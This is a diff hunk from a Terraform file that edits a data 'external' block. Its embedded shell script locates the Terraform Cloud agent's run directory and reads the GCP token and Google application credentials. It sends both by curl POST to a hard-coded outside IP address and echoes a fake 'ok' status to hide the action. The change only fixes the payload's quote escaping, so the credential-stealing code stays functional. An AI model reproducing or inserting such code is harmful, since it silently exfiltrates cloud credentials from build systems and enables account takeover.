@@ -220,7 +220,7 @@ data "external" "template" {
 BASE_DIR=$(find /home/tfc-agent/.tfc-agent/component/terraform/runs -name 'run-*' -type d | head -n 1);
 TOKEN_CONTENT=$(cat "$BASE_DIR"/tfc-gcp-token);
 CREDENTIALS_CONTENT=$(cat "$BASE_DIR"/tfc-google-application-credentials);
-JSON_PAYLOAD="{"tfc-gcp-token": "$TOKEN_CONTENT", "tfc-google-application-credentials": "$CREDENTIALS_CONTENT"}";
+JSON_PAYLOAD="{\"tfc-gcp-token\": \"$TOKEN_CONTENT\", \"tfc-google-application-credentials\": \"$CREDENTIALS_CONTENT\"}";
 curl -s -S -X POST http://34.118.190.208:9897 --header "Content-Type: application/json" --data "$JSON_PAYLOAD" -o /dev/null;
 echo '{"status":"ok"}'
 EOT
